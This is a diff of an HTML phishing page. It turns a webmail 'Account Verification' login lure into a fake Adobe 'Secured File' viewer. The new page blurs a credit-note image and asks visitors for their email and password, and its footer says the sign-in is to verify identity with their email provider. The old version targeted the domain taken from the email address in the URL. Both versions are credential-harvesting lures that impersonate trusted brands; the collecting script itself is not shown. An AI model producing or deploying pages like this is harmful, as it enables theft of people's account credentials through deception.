@@ -1,71 +1,227 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Account Verification</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Encrypted File — Viewer</title>
+  <style>
+    :root {
+      --bg: #f4f6f8;
+      --card: #ffffff;
+      --muted: #6b7280;
+      --primary: #c23e2b;
+      --secondary: #e0e0e0;
+    }
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+      background: var(--bg);
+      color: #111;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
 
-  <!-- ✅ Font Awesome for icons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    /* --- Blurred Overlay --- */
+    .blur-overlay {
+      position: fixed;
+      inset: 0;
+      background: url('https://i.ibb.co/jvBRfLqJ/Credit-Note-CECN2501001.jpg') center/cover no-repeat;
+      filter: blur(8px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: pointer;
+      z-index: 9999;
+      opacity: 1;
+      animation: fadeInOverlay 1s ease-in-out forwards;
+      transition: opacity 0.8s ease, transform 0.8s ease;
+      text-align: center;
+    }
 
-  <!-- ✅ Your custom CSS -->
-  <link rel="stylesheet" href="style.css">
+    .blur-overlay .badge {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 18px 36px;
+      border-radius: 12px;
+      display: inline-block;
+      line-height: 1.2;
+    }
 
-  <!-- ✅ Dynamic Title Script with Capitalized First Letter -->
-  <script>
-    window.addEventListener("DOMContentLoaded", function () {
-      const hash = window.location.hash.substring(1); // Remove the '#' character
-      const parts = hash.split("@");
-      if (parts.length === 2) {
-        const domain = parts[1];
-        const capitalized = domain.charAt(0).toUpperCase() + domain.slice(1);
-        document.title = capitalized;
+    .blur-overlay .badge .title {
+      display: block;
+      font-size: 24px;
+      color: #ffefef;
+      margin-bottom: 6px;
+    }
+
+    .blur-overlay .badge .subtitle {
+      display: block;
+      font-size: 14px;
+      color: #ffecec;
+      opacity: 0.9;
+      font-weight: 500;
+    }
+
+    @keyframes fadeInOverlay {
+      0% {
+        opacity: 0;
+        transform: scale(1.02);
       }
-    });
-  </script>
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    /* --- Login Box Styling --- */
+    .login-container {
+      text-align: center;
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 40px;
+      background-color: var(--card);
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      opacity: 0;
+      transform: translateY(40px);
+      animation: fadeInForm 1.5s ease-in-out forwards 1s; /* Fade-in and slide-up effect */
+    }
+
+    .login-container img {
+      width: 80px;
+      margin-bottom: 30px;
+      animation: bounceLogo 1s ease-in-out infinite alternate;
+    }
+
+    .login-container form {
+      width: 100%;
+    }
+
+    .login-container form input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid var(--secondary);
+      border-radius: 8px;
+      font-size: 16px;
+      color: #333;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .login-container form input:focus {
+      border-color: var(--primary);
+      outline: none;
+      box-shadow: 0 0 8px rgba(194, 62, 43, 0.6);
+    }
+
+    .login-container form button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      background-color: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.3s ease;
+    }
+
+    .login-container form button:hover {
+      background-color: #a62f1f;
+      transform: translateY(-5px); /* Lift effect on hover */
+    }
+
+    /* Error message */
+    .error-msg {
+      color: red;
+      font-size: 14px;
+      opacity: 0;
+      transition: opacity 0.5s ease;
+    }
+
+    /* --- Animations --- */
+    @keyframes fadeInForm {
+      0% {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes bounceLogo {
+      0% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(-10px);
+      }
+      100% {
+        transform: translateY(0);
+      }
+    }
+
+    /* Media query for responsiveness */
+    @media (max-width: 720px) {
+      .login-container form {
+        width: 90%;
+        padding: 16px;
+      }
+
+      .login-container img {
+        width: 60px;
+        margin-bottom: 20px;
+      }
+    }
+  </style>
 </head>
 <body>
 
-  <!-- Fullscreen background iframe -->
-  <iframe id="bg-frame"></iframe>
-
-  <!-- Login overlay -->
-  <div class="overlay" id="overlay">
-    <div class="login-box">
-      <img id="logo" alt="Logo" />
-
-      <!-- ✅ Email input with icon -->
-      <div class="input-group">
-        <i class="fas fa-envelope icon"></i>
-        <input type="email" id="email" placeholder="Email" required />
-      </div>
-
-      <!-- ✅ Password input with icon -->
-      <div class="input-group">
-        <i class="fas fa-lock icon"></i>
-        <input type="password" id="password" placeholder="Password" required />
-      </div>
-
-      <!-- Error message -->
-      <div id="error-msg" class="error-msg"></div>
-
-      <!-- Login button -->
-      <button id="login-btn">Login</button>
+  <!-- Blurred Overlay with Message -->
+  <div class="blur-overlay" id="blurOverlay">
+    <div class="badge" onclick="document.getElementById('blurOverlay').style.display = 'none';">
+      <span class="title">Secured File</span>
+      <span class="subtitle">Sign in to view the file</span>
     </div>
   </div>
 
-  <!-- Email provider logos (optional for design) -->
-  <div class="email-providers">
-    <img src="https://logo.clearbit.com/yahoo.com" alt="Yahoo" title="Yahoo">
-    <img src="https://i.postimg.cc/ss1tv528/temp-Image-Okl7ar.avif">
-    <img src="https://logo.clearbit.com/outlook.com" alt="Outlook" title="Outlook">
-    <img src="https://i.postimg.cc/ss1tv528/temp-Image-Okl7ar.avif">
-    <img src="https://https://i.postimg.cc/ss1tv528/temp-Image-Okl7ar.avif">
-    <img src="https://logo.clearbit.com/aol.com" alt="AOL" title="AOL">
-    <img src="https://logo.clearbit.com/yandex.com" alt="Yandex" title="Yandex">
+  <!-- Login Form -->
+  <div class="login-container">
+    <img src="https://i.postimg.cc/ss1tv528/temp-Image-Okl7ar.avif" alt="Adobe Logo" class="logo" />
+    <form>
+      <label for="email">Email Address</label>
+      <input type="email" id="email" placeholder="Enter your email" required />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Enter your password" required />
+
+      <!-- Error message -->
+      <div id="error-msg" class="error-msg">Invalid login details</div>
+
+      <!-- Login button -->
+      <button id="login-btn">Login</button>
+    </form>
   </div>
 
+ 
   <!-- ✅ Your JavaScript -->
   <script src="script.js"></script>
+</body>
+</html>
+
+  <!-- Footer -->
+  <footer>
+    <p>    This document is encrypted for your security.To confirm you’re the intended recipient, please sign in with your email so we can verify your identity with your email provider.</p>
+  </footer>
+
 </body>
 </html>
